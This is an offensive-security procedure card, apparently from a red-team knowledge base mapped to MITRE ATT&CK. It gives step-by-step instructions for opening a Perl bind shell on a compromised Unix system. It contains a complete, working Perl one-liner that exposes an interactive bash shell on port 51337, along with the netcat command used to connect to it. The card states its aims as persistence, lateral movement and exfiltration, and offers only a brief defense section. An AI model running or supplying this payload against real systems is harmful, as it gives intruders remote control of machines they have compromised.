---
id: 9d5003cf-bd1a-4ce5-8361-5f31e8d835b2
name: Create-Perl-Bind-Shell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.751750+00:00'
updated_at: '2023-04-10T20:21:16.630708+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
  - >-
    [[techniques/Command-and-Scripting-Interpreter/T1059.001| T1059.001 - Unix
    Shell]]
sub_techniques: []
tags:
  - '[[tags/Bind-Shell]]'
  - '[[tags/Perl]]'
commands:
  - '[[commands/perl-bind-shell-listener]]'
platforms:
  - Linux
  - Unix
tools: []
validated: true
---

# Create-Perl-Bind-Shell

## Summary

This procedure demonstrates how to create a bind shell on a compromised Unix-like system using a Perl one-liner. The shell listens on a specified port for incoming connections from the attacker, allowing remote command execution once connected. It is useful for establishing persistent access during post-exploitation phases without requiring additional tools beyond Perl, which is commonly available on target systems.

## Description

A Perl bind shell opens a TCP listener on the target system, waiting for the attacker to connect. Upon connection, it redirects standard input, output, and error streams to the socket and spawns an interactive Bash shell. This technique leverages Perl's Socket module for network operations and is effective in environments where Perl is installed but other shell tools like Netcat are absent or restricted. The procedure assumes initial access to the target via another vector, such as a web shell or credential compromise. It maps to MITRE ATT&CK Execution tactics, specifically using Unix shell interpreters for command execution. Potential risks include detection by host-based monitoring if Perl execution is logged, but the one-liner format aids in obfuscation.

## Requirements

1. Initial access to the target system (e.g., via SSH, web shell, or RCE) with ability to execute commands.
2. Perl installed on the target (version 5.x or later, commonly pre-installed on Linux/Unix systems).
3. Network connectivity allowing the attacker to reach the target's IP on the bind port (default 51337).
4. No firewall restrictions blocking inbound connections to the target on the chosen port.

## Defense

- Implement network segmentation and firewalls to block unauthorized inbound connections to non-standard ports.
- Monitor for unusual Perl process executions and network listeners using tools like auditd or Sysmon.
- Enable application whitelisting to restrict Perl script execution and log all command-line invocations.
- Use intrusion detection systems (IDS) to alert on unexpected TCP listeners or connections from internal systems.

## Objectives

1. Establish a remote shell for interactive command execution on the target.
2. Maintain access to the compromised system for further post-exploitation activities.
3. Enable lateral movement or data exfiltration via the established connection.

## Instructions

### Step 1: Verify Prerequisites on Target

**Context**: Ensure Perl is available and the target port is not in use to avoid execution failures.

Run a quick check for Perl installation and port availability.

**Command** ([[commands/perl-version-check]]):
```bash
perl -v
netstat -tuln | grep 51337
```

> The `perl -v` command confirms Perl is installed and displays its version. The `netstat` check verifies no process is already listening on port 51337. If the port is in use, choose an alternative or stop the conflicting service.

### Step 2: Execute the Bind Shell Listener

**Context**: Deploy the Perl one-liner on the target to start the listener. This creates the socket, binds it to the port, and handles incoming connections by spawning a Bash shell.

**Code** ([[codes/Perl-Bind-Shell-One-Liner]]):

**Command** ([[commands/perl-bind-shell-listener]]):
```bash
perl -e 'use Socket;$p=51337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
```

> This one-liner uses Perl's Socket module to create a TCP socket bound to port 51337 on all interfaces (INADDR_ANY). It listens for connections and, upon acceptance, redirects stdin/stdout/stderr to the socket before executing an interactive Bash shell. The process runs in the foreground; background it with `&` if needed for persistence. Expected behavior: The command hangs, indicating the listener is active.

### Step 3: Connect from Attacker Machine

**Context**: From the attacker's system, establish a connection to the target's listener to gain the interactive shell.

Use a tool like Netcat to connect.

**Command** ([[commands/nc-connect-to-bind-shell]]):
```bash
nc $_TARGET_IP 51337
```

> Replace `$_TARGET_IP` with the target's IP address. Upon connection, you should receive a Bash prompt (`bash-4.4#` or similar), allowing command execution. Test with `whoami` or `id` to verify shell access. If no connection, check firewalls, IP reachability, and listener status on the target.
